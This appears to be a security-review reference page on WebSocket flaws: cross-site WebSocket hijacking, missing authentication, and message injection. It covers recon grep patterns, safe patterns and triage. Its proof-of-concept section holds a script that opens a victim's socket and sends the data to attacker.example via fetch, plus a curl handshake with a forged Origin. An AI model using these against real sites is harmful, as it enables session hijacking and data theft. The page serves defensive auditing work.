---
name: websocket_security
description: WebSocket security — Cross-Site WebSocket Hijacking (CSWSH) via missing Origin validation on the upgrade handshake, missing authentication/authorization on the WS connection or per message, and unsanitized message broadcast (CWE-345/CWE-284/CWE-346)
---

# WebSocket Security (CSWSH / Missing Auth / Message Injection) (CWE-345, CWE-284, CWE-346)

The WebSocket handshake is an HTTP upgrade that browsers send **with the user's cookies** but **without** the same-origin restrictions that apply to `fetch`/XHR (there is no CORS preflight for `ws://`/`wss://`). A server that does not validate the `Origin` header on the upgrade — and relies on the ambient session cookie for auth — can be connected to from any attacker page on behalf of the logged-in victim. Beyond that handshake flaw, WS endpoints frequently skip authentication entirely and echo/broadcast message payloads without sanitization.

## What It Is / Is Not

- **Is**:
  1. **CSWSH** — upgrade handler accepts connections without checking `Origin` against an allowlist while authenticating via cookies (cross-site, cookie-driven).
  2. **Missing auth/authz** — WS handler processes messages without verifying a session/JWT, or enforces authz only at handshake and not per message.
  3. **Message injection** — `event.data` broadcast/echoed into other clients' DOM (stored DOM XSS) or into a sink without encoding.
- **Is not**: CSRF on a normal HTTP endpoint (`csrf.md` — but CSWSH is the WS analogue), CORS misconfiguration on `fetch` (`cors_misconfiguration.md`), or `ws://` cleartext transport alone (`cleartext_transmission.md`, cross-ref). When the only issue is `ws://` carrying tokens, report cleartext; when origin/auth is missing, report here.

## Source -> Sink Pattern

- **CSWSH source**: cross-origin attacker page opens `new WebSocket('wss://victim/...')`; the browser attaches victim cookies. **Sink**: server upgrade handler that authorizes purely on the cookie session with no `Origin` allowlist check.
- **Message-injection source**: `event.data` / received frame. **Sink**: broadcast to all clients → `innerHTML`/template (XSS), or a query/command/file sink (see the relevant injection reference).

## Recon Indicators (Grep)

```bash
# Node ws / Socket.IO servers — check for an Origin/verifyClient guard nearby
rg -n "new WebSocket\.Server|WebSocketServer\s*\(|require\(['\"]ws['\"]\)|socket\.io" --glob '*.{js,ts}'
rg -n "verifyClient|handleProtocols|checkOrigin|origin" --glob '*.{js,ts}'
# Go gorilla/coder — Upgrader with no CheckOrigin, or CheckOrigin returning true unconditionally
rg -n "websocket\.Upgrader\{" -A4 --glob '*.go'
rg -n "CheckOrigin:\s*func\([^)]*\)\s*bool\s*\{\s*return\s+true" --glob '*.go'
# Python (websockets / starlette / channels / aiohttp) handlers
rg -n "websocket\.accept|async def .*\bwebsocket\b|@websocket_route|WebsocketConsumer" --glob '*.py'
# Java/Spring — endpoint config; check for setAllowedOrigins("*")
rg -n "@ServerEndpoint|registerWebSocketHandlers|setAllowedOrigins" --glob '*.java'
# Broadcast of raw message (XSS via WS) and missing per-message auth
rg -n "clients\.forEach|broadcast|\.emit\(|\.send\(\s*(message|data|msg)\b" --glob '*.{js,ts}'
```

## Vulnerable Conditions

- Upgrade accepted with **no `Origin` allowlist** while the connection is authorized by an ambient cookie session → **CSWSH** (attacker reads/acts on victim's socket).
- Go `websocket.Upgrader{}` with default `CheckOrigin` (returns true for same-host only in older versions; explicit `return true` disables the check entirely) on a cookie-authenticated endpoint.
- Spring `setAllowedOrigins("*")` (or SockJS allowed-origins `*`) on an authenticated handler.
- WS handler that never verifies identity (`ws.on('message', ...)` acts on any connection), or checks auth once at connect but not on privileged messages.
- Received `event.data` broadcast to other clients and rendered via `innerHTML` → stored DOM XSS affecting every connected user.

## Safe Patterns

- **Validate `Origin`** on the handshake against a strict allowlist (exact scheme+host; reject missing/unknown Origin). Go: implement `CheckOrigin`; `ws`: use `verifyClient`/check `info.origin`; Spring: `setAllowedOrigins("https://app.example.com")` (never `*`).
- **Authenticate the connection** with a token that is **not** an ambient cookie — e.g., a short-lived ticket/JWT passed in the first message or `Sec-WebSocket-Protocol`, validated server-side; bind the socket to the authenticated principal.
- **Authorize every message**, not only the handshake (subscribe/publish/command checks per frame against the bound principal).
- **Encode message payloads** before rendering; treat `event.data` as untrusted (route through the appropriate injection sanitizer).
- Use `wss://` only (cross-ref `cleartext_transmission.md`).

## Severity / Triage

- CSWSH on a cookie-authenticated socket exposing sensitive data or actions → **High** (cross-site account access without user interaction beyond visiting a page).
- Missing authentication on a privileged WS endpoint → **High**.
- Per-message authz missing (handshake-only) on sensitive operations → **High/Medium**.
- Broadcast XSS via WS → severity per `xss.md` (stored DOM XSS → High).
- `Origin` checked / token-based (non-cookie) auth present → **FALSE POSITIVE** for CSWSH.

## Dynamic Test / PoC

```html
<!-- CSWSH: host on attacker origin, lure the logged-in victim to visit -->
<script>
  const ws = new WebSocket('wss://victim.example/ws');         // victim cookies auto-attached
  ws.onmessage = e => fetch('https://attacker.example/x?d=' + encodeURIComponent(e.data));
  ws.onopen   = () => ws.send(JSON.stringify({action: 'getAccountData'}));
</script>
```
```bash
# Handshake without/with forged Origin — success on a cookie-auth socket => CSWSH
curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: $(head -c16 /dev/urandom|base64)" \
  -H "Origin: https://attacker.example" -H "Cookie: session=<victim>" \
  https://victim.example/ws
```
Confirmed when the cross-origin connection succeeds (HTTP 101) and returns the victim's data.

## Common False Alarms

- Public, unauthenticated broadcast sockets carrying no per-user data and no privileged actions (origin check not security-relevant).
- Endpoints authenticated by a non-cookie bearer token validated in the first frame (CSWSH not applicable — attacker page cannot obtain the token).
- `Origin`/allowlist enforced at a reverse proxy/API gateway in front of the app (verify it exists before closing).

## Cross-References

- `csrf.md` — CSWSH is the WebSocket analogue of CSRF; cookie-driven, cross-site.
- `cors_misconfiguration.md` — analogous origin-trust failure for `fetch`/XHR.
- `cleartext_transmission.md` — `ws://` carrying tokens.
- `xss.md` — message broadcast rendered into the DOM.
- `idor.md` / `race_conditions.md` — per-message authorization and concurrency on WS streams.

## Core Principle

Treat the WebSocket handshake as an authentication boundary: validate `Origin` against an allowlist, authenticate with a credential the attacker's page cannot replay (not an ambient cookie alone), authorize every message, and encode all payloads.
